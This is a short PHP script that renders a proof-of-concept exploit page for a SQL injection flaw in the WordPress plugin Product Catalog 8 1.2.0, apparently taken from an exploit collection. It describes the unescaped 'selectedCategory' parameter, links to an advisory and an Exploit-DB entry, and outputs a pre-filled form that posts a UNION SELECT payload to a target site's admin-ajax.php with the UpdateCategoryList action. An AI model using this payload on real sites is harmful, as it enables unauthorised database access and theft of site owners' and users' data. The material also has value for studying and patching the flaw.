<?php
  echo "<h3>🔥WordPress Plugin Product Catalog 8 1.2.0 🔥 SQL Injection🔥</h3>";
  echo "<p>1 - Description:";
  echo "_POST[ ‘selectedCategory’ ] is not escaped.";
  echo "UpdateCategoryList() is accessible for any user.</p>";
  echo "<a href=\"http://lenonleite.com.br/en/blog/2016/11/18/product-catalog-8-plugin-wordpress-sql-injection/\">http://lenonleite.com.br/en/blog/2016/11/18/product-catalog-8-plugin-wordpress-sql-injection/</a>";
  echo "<a href=\"https://www.exploit-db.com/exploits/40783/\">https://www.exploit-db.com/exploits/40783/</a>";
  echo "<form class=\"wp-form\" method=\"post\" action=\"http://".$url."/wp-admin/admin-ajax.php\">";
  echo " <p>selectedCategory  <input type=\"text\" size=\"50\" name=\"selectedCategory\" value=\"0 UNION SELECT 1,2,3,4,5,6 FROM wp_terms WHERE term_id=1\"></p>";
  echo " <p>action  <input type=\"text\" size=\"50\" name=\"action\" value=\"UpdateCategoryList\"></p>";
  echo "<input type=\"submit\" value=\"Send\">";
  echo "</form>";
 ?>
